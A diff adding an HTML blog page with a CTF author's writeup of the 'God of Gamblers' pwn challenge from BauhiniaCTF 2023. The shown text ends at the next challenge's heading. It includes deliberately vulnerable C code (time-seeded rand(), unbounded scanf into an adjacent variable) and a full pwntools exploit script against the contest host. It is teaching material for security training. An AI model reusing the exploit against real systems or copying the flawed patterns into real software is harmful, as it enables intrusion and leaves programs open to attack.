@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html class="" lang="en-us"><head>
+    
+    <meta name="viewport" content="width=device-width" />
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=7" />
+
+    <link
+    rel="icon"
+    href='/favicon.png'
+/>
+<link
+    rel="shortcut icon"
+    href='/favicon.ico'
+    type="image/x-icon"
+/>
+<link
+    rel="apple-touch-icon"
+    href='/apple-touch-icon.png'
+/>
+
+    <link
+        rel="icon"
+        href='/logo.svg'
+        type="image/svg+xml"
+    />
+
+<title>
+        
+            BauhiniaCTF 2023 Author Writeups  &ndash;
+        
+        Blogs
+    </title>
+    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" />
+    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" />
+    
+    
+    <link type="text/css" rel="stylesheet" href=https://bott0n.github.io/css/styles.6f84514ad632600fba315252a38e35f30218f3d5ec268c1236f62782176917002e704c2b142a2d949bd831c6feabc3d6db35a3c6d6e151b839b9fe80cc19fa4f.css integrity="sha512-b4RRStYyYA&#43;6MVJSo4418wIY89XsJowSNvYnghdpFwAucEwrFCotlJvYMcb&#43;q8PW2zWjxtbhUbg5uf6AzBn6Tw==" />
+<meta name="author" content="botton" />
+
+    
+        <meta name="keywords" content='ctf' />
+    
+    
+        <meta name="description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
+    
+
+<meta property="og:site_name"
+    content='Blogs' />
+
+    <meta property="og:title" content="BauhiniaCTF 2023 Author Writeups" />
+    <meta property="og:type" content="article" />
+    
+    <meta
+        property="article:author" content="botton" />
+    <meta
+        property="article:published_time"
+        content='2023-08-20T17:37:11Z&#43;0800' />
+    
+        
+            <meta property="article:tag" content="ctf" />
+        
+    
+    <meta property="og:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
+    <meta property="og:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta property="og:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:domain"
+      content='bott0n.github.io'
+/>
+<meta property="twitter:url" content="https://bott0n.github.io/posts/bauhiniactf2023-author-writeups/" />
+
+
+    <meta name="twitter:title" content="BauhiniaCTF 2023 Author Writeups" />
+    
+    <meta name="twitter:image"
+        content='https://bott0n.github.io/icon512.png
+    ' />
+    
+        <meta name="twitter:description" content="BauhiniaCTF 2023 Author Writeups of my challenges" />
+    
+
+<link rel="manifest" href="/manifest/index.json" />
+</head>
+
+
+<body>
+        <div id="baseContainer"><header class="">
+<div class="titleAndSearchContainer">
+        <div id="titleContainer">
+            
+                <a class="unstyledLink" href="/">
+                    <img src='/logo.svg' />
+                </a>
+            
+            <div class="rightOfLogo">
+                <div class="titleAndHamburger">
+                    <h1>
+                        <a class="unstyledLink" href="/">Blogs</a>
+                        
+                    </h1>
+                    
+                </div>
+                <div id="wide_nav"><nav>
+    
+    <ul id="main-nav">
+        <li><a href="/">Home</a></li>
+        
+            <li><a href="/posts">Posts</a></li>
+        
+        
+        
+        
+        
+        
+            <li><a href="https://bott0n.github.io/about/aboutme/">About</a></li>
+        
+        
+            <li><a href="/tags">Tags</a></li>
+        
+        
+    </ul>
+</nav>
+</div>
+            </div>
+        </div>
+        <div class="search">
+    <input id="searchbar" type="text" placeholder='Search' />
+    <a class="nerdlink" onclick="newSearch();">&#xf002;</a>
+</div>
+<script>
+    function newSearch() {
+        let term = searchbar.value.trim();
+        if (!term) return;
+        location.href = `/search?q=${term}`;
+    }
+    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
+</script>
+
+    </div>
+    <div id="links">
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="/index.xml">
+    
+    
+        &#xf09e;
+    
+    <span>
+        RSS
+    </span>
+</a>
+
+        
+        <a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://github.com/bott0n">
+    
+    
+        &#xf09b;
+    
+    <span>
+        GitHab
+    </span>
+</a>
+<a
+    
+        rel="noreferrer"
+    
+    target="_blank"
+    class="nerdlink"
+    href="https://twitter.com/botton3310">
+    
+    
+        &#xf099;
+    
+    <span>
+        Titter
+    </span>
+</a>
+
+    </div>
+    
+
+</header>
+<div id="contentContainer">
+                <div id="content">
+                    <main>
+<article class="card single">
+    
+        <h1>BauhiniaCTF 2023 Author Writeups</h1>
+    
+    
+        <p class="date">
+            <span title='Date'> </span>
+    2023-08-20
+
+</p>
+    
+    
+    
+    <div class="articleToc">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</a>
+      <ul>
+        <li><a href="#vulnerability-1">Vulnerability 1</a></li>
+        <li><a href="#vulnerability-2">Vulnerability 2</a></li>
+        <li><a href="#exploit-script">Exploit script</a></li>
+      </ul>
+    </li>
+    <li><a href="#kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</a>
+      <ul>
+        <li><a href="#vulnerability">Vulnerability</a></li>
+        <li><a href="#uaf---leak-kernel-address">UAF - Leak kernel address</a></li>
+        <li><a href="#uaf---arbitrary-address-write-primitive-aaw">UAF - Arbitrary Address Write Primitive (AAW)</a></li>
+        <li><a href="#exploit-script-1">Exploit Script</a></li>
+      </ul>
+    </li>
+    <li><a href="#disconnect-500-points--1-solve">Disconnect (500 points / 1 solve)</a>
+      <ul>
+        <li><a href="#intended-solution">Intended Solution</a></li>
+        <li><a href="#exploit-script-2">Exploit Script</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    <hr />
+</div>
+
+    <div><h1 id="introduction">Introduction</h1>
+<p>In Bauhinia CTF 2023, I have created 3 pwn challenge: <code>God of Gamblers</code>, <code>Kernpass</code>, and <code>Disconnect</code>.</p>
+<p>In this post, I will show you the author writeups and the intended solution of those challenges.</p>
+<p>Hope You enjoyed the challenges.</p>
+<h1 id="god-of-gamblers-50-points--45-solves">God of Gamblers (50 points / 45 solves)</h1>
+<p><img src="https://i.imgur.com/S3VTwBJ.png" alt="Imgur"></p>
+<p>This challenge is aimed for beginner-friendly which doesn&rsquo;t require much exploit skill and technique. The challenging point is to understand that it is easy to predict the random value gerenarted by <code>srand(time(0))</code> and  <code>rand()</code>, and a little bit buffer overflow.
+In this challenge, only the stripped binary provided. Here is the source code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>() {
+	setvbuf(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+	setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+	setvbuf(stderr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+	alarm(<span style="color:#ae81ff">60</span>);
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">tournament</span>() {
+    FILE <span style="color:#f92672">*</span>fp;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> guess;
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> random_number;
+    
+    <span style="color:#75715e">// Open /dev/urandom for reading
+</span><span style="color:#75715e"></span>    fp <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL) {
+        printf(<span style="color:#e6db74">&#34;Error opening /dev/urandom.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>);
+    }
+
+    <span style="color:#75715e">// Read 4 bytes from /dev/urandom into the random_number variable
+</span><span style="color:#75715e"></span>    fread(<span style="color:#f92672">&amp;</span>random_number, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">1</span>, fp);
+
+    <span style="color:#75715e">// Close /dev/urandom
+</span><span style="color:#75715e"></span>    fclose(fp);
+
+    <span style="color:#75715e">// Do something with the random number
+</span><span style="color:#75715e"></span>    printf(<span style="color:#e6db74">&#34;Now you enter the Charity Gamble Tournament</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;This is the final round</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;Win the flag or Lose the game</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;Enter your guess:&#34;</span>);
+    scanf(<span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#f92672">&amp;</span>guess);
+
+    <span style="color:#66d9ef">if</span> (guess <span style="color:#f92672">==</span> random_number) {
+        printf(<span style="color:#e6db74">&#34;You are the god of gamblers!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        printf(<span style="color:#e6db74">&#34;Here is your flag!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        win();
+    } <span style="color:#66d9ef">else</span> {      
+	    printf(<span style="color:#e6db74">&#34;You lose!&#34;</span>);
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>(){
+    FILE <span style="color:#f92672">*</span>fp;
+    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">40</span>];;
+    <span style="color:#75715e">// Open the file for reading
+</span><span style="color:#75715e"></span>    fp <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL) {
+        printf(<span style="color:#e6db74">&#34;Error opening file.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>);
+    }
+
+    fread(<span style="color:#f92672">&amp;</span>flag, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">1</span>, fp);
+    printf(<span style="color:#e6db74">&#34;%s&#34;</span>, flag);
+}
+
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+    <span style="color:#66d9ef">int</span> dice1, dice2, dice3, points, guess, result, bet;
+    <span style="color:#66d9ef">int</span> balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>; <span style="color:#75715e">// initialize the player&#39;s balance to 20
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> goal <span style="color:#f92672">=</span> <span style="color:#ae81ff">25000000</span>; <span style="color:#75715e">// set the goal to 25,000,000
+</span><span style="color:#75715e"></span>
+	init();
+
+    srand(time(NULL)); <span style="color:#75715e">// seed the random number generator with the current time
+</span><span style="color:#75715e"></span>
+    printf(<span style="color:#e6db74">&#34;Welcome to the dice game!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+    printf(<span style="color:#e6db74">&#34;You have $%d to start with. The goal is to reach $%d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, balance, goal);
+
+    <span style="color:#66d9ef">while</span> (balance <span style="color:#f92672">&lt;</span> goal) { <span style="color:#75715e">// as long as the player has not reached the goal
+</span><span style="color:#75715e"></span>
+        printf(<span style="color:#e6db74">&#34;Enter your bet (or enter 0 to quit): &#34;</span>);
+        scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>bet);
+
+        <span style="color:#66d9ef">if</span> (bet <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">break</span>; <span style="color:#75715e">// exit the loop if the player chooses to quit
+</span><span style="color:#75715e"></span>        }
+
+        <span style="color:#66d9ef">if</span> (bet <span style="color:#f92672">&gt;</span> balance) {
+            printf(<span style="color:#e6db74">&#34;You don&#39;t have enough money to place that bet.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+            <span style="color:#66d9ef">continue</span>; <span style="color:#75715e">// go back to the top of the loop to ask for a valid bet
+</span><span style="color:#75715e"></span>        }
+
+        printf(<span style="color:#e6db74">&#34;Enter 1 for small or 2 for big: &#34;</span>);
+        scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>guess);
+
+        dice1 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// generate a random number between 1 and 6 for each die
+</span><span style="color:#75715e"></span>        dice2 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+        dice3 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+        points <span style="color:#f92672">=</span> dice1 <span style="color:#f92672">+</span> dice2 <span style="color:#f92672">+</span> dice3; <span style="color:#75715e">// add up the points from the three dice
+</span><span style="color:#75715e"></span>
+        <span style="color:#75715e">// determine if the result is small or big
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (points <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> points <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">9</span>) {
+            result <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// small
+</span><span style="color:#75715e"></span>        } <span style="color:#66d9ef">else</span> {
+            result <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>; <span style="color:#75715e">// big
+</span><span style="color:#75715e"></span>        }
+
+        <span style="color:#75715e">// determine the winner
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (guess <span style="color:#f92672">==</span> result) {
+            balance <span style="color:#f92672">+=</span> bet; <span style="color:#75715e">// player wins
+</span><span style="color:#75715e"></span>            printf(<span style="color:#e6db74">&#34;Congratulations, you win $%d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bet);
+        } <span style="color:#66d9ef">else</span> {
+            balance <span style="color:#f92672">-=</span> bet; <span style="color:#75715e">// player loses
+</span><span style="color:#75715e"></span>            printf(<span style="color:#e6db74">&#34;Sorry, you lose $%d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bet);
+        }
+
+        printf(<span style="color:#e6db74">&#34;The result is %d (dice 1: %d, dice 2: %d, dice 3: %d).</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, points, dice1, dice2, dice3);
+        printf(<span style="color:#e6db74">&#34;Your balance is now $%d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, balance);
+    }
+
+    <span style="color:#66d9ef">if</span> (balance <span style="color:#f92672">&gt;=</span> goal) {
+        printf(<span style="color:#e6db74">&#34;Congratulations, you have reached the goal of $%d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, goal);
+        tournament();
+    } <span style="color:#66d9ef">else</span> {
+        printf(<span style="color:#e6db74">&#34;Thanks for playing! Your final balance is $%d.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, balance);
+    }
+
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+
+</code></pre></div><p>There are two vulnerability in the program.</p>
+<h2 id="vulnerability-1">Vulnerability 1</h2>
+<p>Run the progam, we will seee the goal is to win $25000000 from $20.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Welcome to the dice game!
+You have $20 to start with. The goal is to reach $25000000.
+Enter your bet <span style="color:#f92672">(</span>or enter <span style="color:#ae81ff">0</span> to quit<span style="color:#f92672">)</span>: 
+</code></pre></div><p>To play the game, we need to enter our bet and choose <code>small</code> or <code>big</code></p>
+<pre tabindex="0"><code>Enter your bet (or enter 0 to quit): 20
+Enter 1 for small or 2 for big: 2
+Sorry, you lose $20.
+The result is 6 (dice 1: 1, dice 2: 4, dice 3: 1).
+Your balance is now $0.
+</code></pre><p>The result is combined by 3 dices. 3-9 is small and 10-18 is big.
+From the source code, we can found all the dices are gerneated from <code>rand()</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">dice1 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>; <span style="color:#75715e">// generate a random number between 1 and 6 for each die
+</span><span style="color:#75715e"></span>dice2 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+dice3 <span style="color:#f92672">=</span> rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+points <span style="color:#f92672">=</span> dice1 <span style="color:#f92672">+</span> dice2 <span style="color:#f92672">+</span> dice3; <span style="color:#75715e">// add up the points from the three dice
+</span></code></pre></div><p>Also, we knew the seed is based on time(0);</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">srand(time(NULL));
+</code></pre></div><p>In view of that, we can use the same seed to predict the <code>rand()</code> result.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># Load the C standard library</span>
+libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
+
+<span style="color:#75715e"># Define the argument and return types for srand</span>
+libc<span style="color:#f92672">.</span>srand<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_uint]
+
+<span style="color:#75715e"># Define the argument and return types for rand</span>
+libc<span style="color:#f92672">.</span>rand<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+
+<span style="color:#75715e"># Seed the random number generator with the current time</span>
+libc<span style="color:#f92672">.</span>srand(int(time<span style="color:#f92672">.</span>time()))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess</span>(libc):
+    <span style="color:#75715e"># Generate a random number between 1 and 6</span>
+    r1 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    r2 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    r3 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    
+    print(r1,r2,r3)
+    points <span style="color:#f92672">=</span> r1<span style="color:#f92672">+</span>r2<span style="color:#f92672">+</span>r3
+    <span style="color:#66d9ef">if</span> points <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+
+balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">21</span>):
+    sla(<span style="color:#e6db74">&#34;Enter your bet (or enter 0 to quit): &#34;</span>, str(balance))
+    sla(<span style="color:#e6db74">&#34;Enter 1 for small or 2 for big: &#34;</span>, str(guess(libc)))
+    balance <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
+</code></pre></div><h2 id="vulnerability-2">Vulnerability 2</h2>
+<p>With the above prediction, We are entered to the final stage.</p>
+<p>This time, the challenge seems require us to guess the value from <code>/dev/urandom</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">  <span style="color:#75715e">// Open /dev/urandom for reading
+</span><span style="color:#75715e"></span>    fp <span style="color:#f92672">=</span> fopen(<span style="color:#e6db74">&#34;/dev/urandom&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+    <span style="color:#66d9ef">if</span> (fp <span style="color:#f92672">==</span> NULL) {
+        printf(<span style="color:#e6db74">&#34;Error opening /dev/urandom.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+        exit(<span style="color:#ae81ff">1</span>);
+    }
+
+    <span style="color:#75715e">// Read 4 bytes from /dev/urandom into the random_number variable
+</span><span style="color:#75715e"></span>    fread(<span style="color:#f92672">&amp;</span>random_number, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">1</span>, fp);
+
+    <span style="color:#75715e">// Close /dev/urandom
+</span><span style="color:#75715e"></span>    fclose(fp);
+</code></pre></div><p>It seems a impossible task for me (maybe it just a piece of cake for crypto player)</p>
+<p>However, when we look closer, it use <code>scanf(&quot;%s&quot;, &amp;guess);</code> to receive the guess and the random_number and the guess are next to each other. So, it is clear to know that, we can input 16 same bytes to pass it.</p>
+<h2 id="exploit-script">Exploit script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> ctypes
+
+TARGET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
+<span style="color:#75715e">#HOST = &#34;127.0.0.1&#34;</span>
+<span style="color:#75715e">#PORT = 9999</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;chall.pwnable.hk&#39;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">20001</span>
+context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span> <span style="color:#75715e"># i386/amd64</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;tmux&#39;</span>,<span style="color:#e6db74">&#39;splitw&#39;</span>,<span style="color:#e6db74">&#39;-h&#39;</span>]
+elf <span style="color:#f92672">=</span> ELF(TARGET)
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;remote&#39;</span>:
+    p <span style="color:#f92672">=</span> remote(HOST, PORT)
+    <span style="color:#75715e"># libc = ELF(&#39;&#39;)</span>
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> process(TARGET)
+    libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+    
+
+<span style="color:#75715e">#--- helper functions</span>
+s       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>send(data)
+sa      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendafter(delim, data) 
+sl      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data               :p<span style="color:#f92672">.</span>sendline(data) 
+sla     <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delim,data         :p<span style="color:#f92672">.</span>sendlineafter(delim, data) 
+r       <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> numb<span style="color:#f92672">=</span><span style="color:#ae81ff">4096</span>          :p<span style="color:#f92672">.</span>recv(numb)
+ru      <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> delims, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>  :p<span style="color:#f92672">.</span>recvuntil(delims, drop)
+<span style="color:#75715e"># misc functions</span>
+uu32    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u32(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+uu64    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> data   :u64(data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+leak    <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> name,addr :log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> = </span><span style="color:#e6db74">{:#x}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(name, addr))
+<span style="color:#75715e">#---</span>
+
+
+<span style="color:#75715e"># Load the C standard library</span>
+libc <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>CDLL(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
+
+<span style="color:#75715e"># Define the argument and return types for srand</span>
+libc<span style="color:#f92672">.</span>srand<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [ctypes<span style="color:#f92672">.</span>c_uint]
+
+<span style="color:#75715e"># Define the argument and return types for rand</span>
+libc<span style="color:#f92672">.</span>rand<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+
+<span style="color:#75715e"># Seed the random number generator with the current time</span>
+libc<span style="color:#f92672">.</span>srand(int(time<span style="color:#f92672">.</span>time()))
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">guess</span>(libc):
+    <span style="color:#75715e"># Generate a random number between 1 and 6</span>
+    r1 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    r2 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    r3 <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    
+    print(r1,r2,r3)
+    points <span style="color:#f92672">=</span> r1<span style="color:#f92672">+</span>r2<span style="color:#f92672">+</span>r3
+    <span style="color:#66d9ef">if</span> points <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">10</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>
+
+
+balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">21</span>):
+    sla(<span style="color:#e6db74">&#34;Enter your bet (or enter 0 to quit): &#34;</span>, str(balance))
+    sla(<span style="color:#e6db74">&#34;Enter 1 for small or 2 for big: &#34;</span>, str(guess(libc)))
+    balance <span style="color:#f92672">*=</span> <span style="color:#ae81ff">2</span>
+
+sl(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+p<span style="color:#f92672">.</span>interactive()
+
+</code></pre></div><h1 id="kernpass-430-points--10-solves">Kernpass (430 points / 10 solves)</h1>
+<p><img src="https://i.imgur.com/VxCl23a.png" alt="Imgur"></p>
